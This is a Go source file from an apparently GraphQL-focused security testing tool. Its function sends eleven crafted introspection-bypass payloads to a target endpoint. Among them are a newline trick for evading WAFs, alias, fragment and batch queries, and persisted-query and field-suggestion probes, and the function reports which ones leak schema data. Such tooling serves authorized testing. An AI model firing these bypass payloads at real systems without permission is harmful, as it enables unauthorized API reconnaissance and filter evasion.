package analysis

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"strings"
	"time"

	"github.com/0xDTC/0xGQLForge/internal/schema"
)

// TryBypass attempts various introspection bypass techniques against a target GraphQL endpoint.
func TryBypass(targetURL string) []schema.BypassResult {
	client := &http.Client{Timeout: 10 * time.Second}
	var results []schema.BypassResult

	techniques := []struct {
		name    string
		desc    string
		payload string
		method  string
		ct      string
	}{
		{
			"standard_introspection",
			"Standard introspection query via POST",
			`{"query":"{ __schema { queryType { name } types { name kind fields { name } } } }"}`,
			"POST", "application/json",
		},
		{
			"get_introspection",
			"Introspection via GET request (may bypass POST-only filters)",
			"",
			"GET", "",
		},
		{
			"newline_bypass",
			"Introspection with newline in query field (WAF bypass)",
			`{"query":"{\n__schema {\nqueryType { name }\n} }"}`,
			"POST", "application/json",
		},
		{
			"alias_bypass",
			"Using aliases to obfuscate __schema query",
			`{"query":"{ s: __schema { queryType { name } types { name kind } } }"}`,
			"POST", "application/json",
		},
		{
			"type_probe",
			"Probe using __type instead of __schema",
			`{"query":"{ __type(name: \"Query\") { name fields { name type { name kind } } } }"}`,
			"POST", "application/json",
		},
		{
			"type_probe_mutation",
			"Probe Mutation type directly",
			`{"query":"{ __type(name: \"Mutation\") { name fields { name type { name kind } } } }"}`,
			"POST", "application/json",
		},
		{
			"fragment_bypass",
			"Introspection using fragments (may bypass simple regex filters)",
			`{"query":"fragment SchemaFields on __Schema { queryType { name } types { name kind } } { __schema { ...SchemaFields } }"}`,
			"POST", "application/json",
		},
		{
			"content_type_bypass",
			"Introspection with application/graphql content type",
			`{ __schema { queryType { name } types { name kind fields { name } } } }`,
			"POST", "application/graphql",
		},
		{
			"batch_bypass",
			"Introspection via batch query array",
			`[{"query":"{ __schema { queryType { name } types { name kind } } }"}]`,
			"POST", "application/json",
		},
		{
			"persisted_query_probe",
			"Check if APQ (Automatic Persisted Queries) is enabled",
			`{"extensions":{"persistedQuery":{"version":1,"sha256Hash":"ecf4edb46db40b5132295c0291d62fb65d6759a9eedfa4d5d612dd5ec54a6b38"}},"variables":{}}`,
			"POST", "application/json",
		},
		{
			"field_suggestion",
			"Send deliberately wrong field to trigger suggestions",
			`{"query":"{ __typenameXYZ }"}`,
			"POST", "application/json",
		},
	}

	for _, t := range techniques {
		result := schema.BypassResult{
			Technique:   t.name,
			Description: t.desc,
			Payload:     t.payload,
		}

		var req *http.Request
		var err error

		if t.method == "GET" {
			gqlQuery := `{ __schema { queryType { name } types { name kind } } }`
			url := targetURL + "?query=" + gqlQuery
			req, err = http.NewRequest("GET", url, nil)
			result.Payload = gqlQuery
		} else {
			req, err = http.NewRequest("POST", targetURL, bytes.NewBufferString(t.payload))
			if t.ct != "" {
				req.Header.Set("Content-Type", t.ct)
			}
		}

		if err != nil {
			result.Response = fmt.Sprintf("request creation error: %v", err)
			results = append(results, result)
			continue
		}

		req.Header.Set("Accept", "application/json")

		resp, err := client.Do(req)
		if err != nil {
			result.Response = fmt.Sprintf("request error: %v", err)
			results = append(results, result)
			continue
		}

		body, _ := io.ReadAll(io.LimitReader(resp.Body, 1<<20)) // 1MB limit
		resp.Body.Close()

		result.Response = truncate(string(body), 500)

		// Check if response contains schema data
		if resp.StatusCode == 200 {
			var gqlResp map[string]json.RawMessage
			if err := json.Unmarshal(body, &gqlResp); err == nil {
				if _, hasData := gqlResp["data"]; hasData {
					dataStr := string(gqlResp["data"])
					if strings.Contains(dataStr, "__schema") || strings.Contains(dataStr, "__type") ||
						strings.Contains(dataStr, "queryType") || strings.Contains(dataStr, "fields") {
						result.Success = true
					}
				}
			}
		}

		results = append(results, result)
	}

	return results
}

func truncate(s string, maxLen int) string {
	if len(s) <= maxLen {
		return s
	}
	return s[:maxLen] + "..."
}
